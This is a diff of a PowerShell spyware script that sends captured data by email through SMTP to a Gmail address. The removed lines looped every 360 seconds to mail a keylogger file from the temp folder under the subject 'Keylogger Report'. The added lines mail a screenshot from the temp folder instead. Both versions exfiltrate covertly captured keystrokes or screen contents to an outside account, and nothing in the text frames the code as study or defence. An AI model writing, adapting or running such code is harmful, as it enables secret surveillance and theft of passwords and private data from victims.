@@ -5,10 +5,7 @@ $SMTPInfo.Credentials = New - Object System.Net.NetworkCredential('zaghum.mughal
 $message = New - Object System.Net.Mail.MailMessage
 $message.From = 'zaghum.mughal.1@gmail.com'
 $message.To.Add('zaghum.mughal.1@gmail.com')
-$message.Subject = 'Keylogger Report'
-$message.Body = 'Success! The keylogger file is attached!'
-while (1) {
-    $message.Attachments.Add("$ENV:temp\key.txt");
-    $SMTPInfo.Send($message);
-    sleep 360
-}
+$message.Subject = 'Screenshot File'
+$message.Body = 'Success! The Screenshot file is attached!'
+$message.Attachments.Add("$ENV:temp\Screenshot.png");
+$SMTPInfo.Send($message);
